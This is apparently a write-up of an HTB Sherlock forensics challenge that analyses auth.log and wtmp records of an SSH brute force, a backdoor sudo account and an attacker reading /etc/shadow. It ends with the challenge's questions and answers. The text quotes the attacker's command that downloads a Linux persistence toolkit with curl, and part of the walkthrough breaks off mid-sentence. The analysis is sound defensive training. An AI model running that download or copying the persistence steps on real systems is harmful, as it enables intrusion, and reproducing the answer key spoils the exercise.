# Brutus | Easy

#confluence #authlog #wtmp #bruteforce #ssh

In this very easy Sherlock, you will familiarize yourself with Unix `auth.log` and `wtmp` logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using `auth.log`. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## Data

##### auth.log

- Logs successful and failed logins
- `sudo` and `su` attempts, and other authentication processes
- Locations:
	- `/var/log/auth.log` (Debian/Ubuntu)
	- `/var/log/secure` (RedHat/CentOS)

Format (ref: [RFC5424](https://datatracker.ietf.org/doc/html/rfc5424#section-6))

```
<Timestamp> <Hostname> <Service>[<process_id>]: <Message>
```

##### wtmp

One of three files which track login/logout activity on Linux systems.

- `/var/run/utmp`: Tracks currently logged in users (displayed with `who`/`w` command or the `utmpump /path/to/wtmp` utility)
- `/var/log/wtmp`: Keeps historic log of login/logout activity (displayed with `last` command)
- `/var/log/btmp`: Keeps a record of invalid login attempts (displayed with `lastb` command)

Format (ref: [wtmp man - Event Types](https://linux.die.net/man/5/wtmp))

```
[Event Type] [PID] [Terminal ID] [User] [Host] [IP Address]
```

## Walkthrough

Taking the `auth.log` file, we have 385 entries spanning a 21 minute time period - `06:18:01` to `06:41:01`. Sorting by service, we see the majority of the traffic comprise `sshd` and `cron` logs:

```
$ cat auth.log | cut -d' ' -f 6 | cut -d[ -f1 | sort | uniq -c | sort -nr
```

Firstly, we see a successful logon for the `root` user from IP `203.101.190.9`. From `06:31:31` to `06:31:44`, there is a large volume of traffic from IP `65.2.161.68` of several attempts to authenticate as 5 distinct users, indicative of bruteforce activity.

Looking for successful attempts, we see the actor successfully logged in as `root` on two occasions (`06:31:40` and `06:32:44`) and `cyberjunkie` at `06:37:34`. The first successful login for `root` takes place during the time of the suspected bruteforce activity with that session being disconnected at the same time:

```
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Received disconnect from 65.2.161.68 port 34782:11: Bye Bye
```

The second session occurs after the bruteforce activity, indicating the actor manually logged in as `root` with the valid credentials found previously.

#### root Session

Corroborating this with `wtmp`, we see a type 7 event corresponding to a `USER_PROCESS` initiated as a result of a successful login as `root` from the IP in question at `06:32:45` - one second following the successful attempt in `auth.log`.

```
$ utmpdump wtmp | grep "\[7\]" | grep 65.2.161.68
...
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
```

Looking at the surrounding logs for the second `root` session, we see the password was accepted at `06:32:44` as stated above. The `systemd-loginid` service then assigns an ID of 37 for the session.

```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

Following this, the user created a new local user, `cyberjunkie`, adding the user to `sudo` group between `06:34:18` and `06:35:15` before disconnecting from the system at `06:37:24`, lasting a total time of 279 seconds. This method of persistence corresponds to [MITRE ATT&CK - T1136.001](https://attack.mitre.org/techniques/T1136/001/).

```
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

#### cyberjunkie Session

From the `auth.log` file, the actor logs in as `cyberjunkie` at `06:37:34` and assigned session ID 49 - given as `06:37:35` in `wtmp`.

The actor then printed out the contents of `/etc/shadow` via `/usr/bin/cat` at `06:37:57` as well as making a cURL request to `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` to download the Linux persistence toolkit. Both actions were carried out using the `sudo`

Following the bruteforce activity, we see a successful authentication for the `root` user:

```
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
```



-----

1. Analyzing the `auth.log`, can you identify the IP address used by the attacker to carry out a brute force attack?

```
65.2.161.68
```

2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

```
root
```

3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

```
2024-03-06 06:32:44
```

4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

```
37
```

5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

```
cyberjunkie
```

6. What is the MITRE ATT&CK sub-technique ID used for persistence?

```
T1136.001
```

7. How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the `auth.log`? (seconds)

```
279
```

8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

```
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

-----

https://0xdf.gitlab.io/2024/04/09/htb-sherlock-brutus.html#timeline